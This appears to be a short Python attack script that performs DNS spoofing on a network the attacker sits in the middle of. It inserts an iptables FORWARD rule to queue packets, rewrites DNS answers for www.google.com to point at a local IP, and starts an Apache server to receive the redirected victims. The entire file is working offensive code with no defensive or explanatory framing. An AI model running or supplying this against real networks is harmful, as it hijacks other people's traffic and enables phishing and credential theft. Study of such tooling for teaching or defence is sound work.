from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import subprocess

queue = NetfilterQueue()
url = "www.google.com"
wlan0_ip = "192.168.0.122"


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if url in str(qname):
            print("[+]Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=wlan0_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


def create_iptables_queue():
    print("[+]Creating iptables queue")
    subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    print("[+]Starting apache server")
    subprocess.run(["service", "apache2", "start"])
    print("[+]Done")


queue.bind(1, process_packet)
try:
    create_iptables_queue()
    queue.run()
except KeyboardInterrupt:
    print("[+]Restoring iptables...")
    subprocess.run(["iptables", "--flush"])
    print("[+]Stopping web server")
    subprocess.run(["service", "apache2", "stop"])
    print("[+]Done")
